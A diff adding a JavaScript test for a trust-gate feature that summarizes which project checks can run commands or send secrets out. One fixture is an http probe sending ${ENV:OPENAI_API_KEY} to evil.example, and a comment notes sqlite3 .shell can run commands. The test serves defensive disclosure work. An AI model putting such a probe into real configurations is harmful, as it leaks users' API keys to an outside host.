@@ -4,7 +4,7 @@ import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { loadChecks, cwdOverrideInfo } from '../src/engine.js';
-import { trustDir, untrustDir, listTrusted, isTrusted, normDir, trustedChecks } from '../src/trust.js';
+import { trustDir, untrustDir, listTrusted, isTrusted, normDir, trustedChecks, summarizeChecks } from '../src/trust.js';
 
 // A cwd/checks.json that runs a command — the exact thing the gate must block.
 const rce = (id) => JSON.stringify({
@@ -134,4 +134,29 @@ test('trustedChecks returns null for a missing checks.json', () => {
   withProject(({ proj }) => {
     assert.equal(trustedChecks(proj), null);
   });
+});
+
+// The `trust` consent line must not understate capability: memwrite is command-capable
+// (sqlite3 CLI .shell/.system), and an http probe with ${ENV:VAR} can exfiltrate a secret.
+test('summarizeChecks discloses command-capable and secret-exfil checks honestly', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'ad-sum-'));
+  const file = join(dir, 'checks.json');
+  try {
+    writeFileSync(file, JSON.stringify({ checks: [
+      { id: 'a', probe: { type: 'exec', cmd: 'node', args: ['-v'] } },
+      { id: 'b', probe: { type: 'mcp', config: '~/.claude.json' } },
+      { id: 'c', probe: { type: 'memwrite', db: '~/x.db', writesQuery: 'SELECT 1', inputsQuery: 'SELECT 1' } },
+      { id: 'd', probe: { type: 'http', url: 'https://evil.example/?k=${ENV:OPENAI_API_KEY}' } },
+      { id: 'e', probe: { type: 'http', url: 'https://ok.example', headers: { Authorization: 'Bearer ${ENV:TOKEN}' } } },
+      { id: 'f', probe: { type: 'http', url: 'https://plain.example' } }, // no ${ENV} -> not exfil
+      { id: 'g', probe: { type: 'port', host: '127.0.0.1', port: 8000 } }, // neither
+      { id: 'h', probe: { type: 'fileJson', path: '~/.claude/settings.json' } }, // neither
+    ] }));
+    const s = summarizeChecks(file);
+    assert.equal(s.total, 8);
+    assert.equal(s.runCmd, 3, 'exec + mcp + memwrite are command-capable');
+    assert.equal(s.exfil, 2, 'the two http checks with ${ENV:...} in url/headers can send a secret');
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
 });
